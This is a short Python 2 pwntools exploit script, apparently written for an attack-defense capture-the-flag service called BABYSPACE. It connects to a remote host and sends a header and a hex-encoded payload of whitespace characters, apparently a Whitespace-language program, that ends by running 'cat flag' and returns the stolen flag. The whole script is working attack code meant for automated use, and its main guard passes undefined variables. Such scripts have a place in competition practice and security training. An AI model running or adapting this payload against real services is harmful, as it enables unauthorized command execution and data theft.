from pwn import *
def main(ip,port):
    print ip
    print port
    try:
	io = remote(ip, port,timeout=5)
#io=process("./BABYSPACE")
	io.send("\x51\x01\x00\x00")
	io.send("\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x20\x20\x09\x09\x20\x20\x20\x09\x09\x20\x20\x09\x20\x20\x20\x09\x09\x20\x09\x09\x20\x0a\x20\x20\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x20\x20\x20\x09\x09\x20\x20\x20\x09\x20\x09\x09\x20\x20\x09\x20\x20\x09\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x20\x20\x09\x09\x20\x20\x20\x09\x20\x20\x09\x09\x09\x09\x09\x09\x20\x09\x20\x20\x20\x0a\x09\x09\x0a\x09\x20\x20\x20\x09\x09\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x20\x20\x09\x09\x20\x20\x20\x09\x09\x20\x20\x09\x20\x20\x20\x09\x09\x20\x09\x09\x09\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x20\x20\x09\x09\x20\x20\x20\x09\x20\x20\x09\x09\x09\x09\x09\x09\x20\x09\x20\x20\x09\x0a\x09\x09\x0a\x09\x09\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x09\x09\x20\x09\x09\x09\x20\x20\x09\x09\x20\x09\x20\x20\x09\x20\x09\x09\x20\x20\x20\x09\x20\x20\x20\x09\x20\x09\x09\x09\x09\x0a\x09\x09\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x09\x09\x20\x09\x20\x20\x20\x20\x09\x09\x09\x20\x20\x09\x09\x20\x20\x09\x20\x09\x09\x09\x09\x0a\x09\x09\x20\x63\x61\x74\x20\x66\x6c\x61\x67\x0a")
	flag=io.recv()[:-1]
        return {'getflag_status':'getflag success', 'flag': flag}
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception, e:
        a = str(e)
        return {'getflag_status':'getflag failed'+a, 'flag':'error'}

if __name__ == '__main__':
    main(ip,port)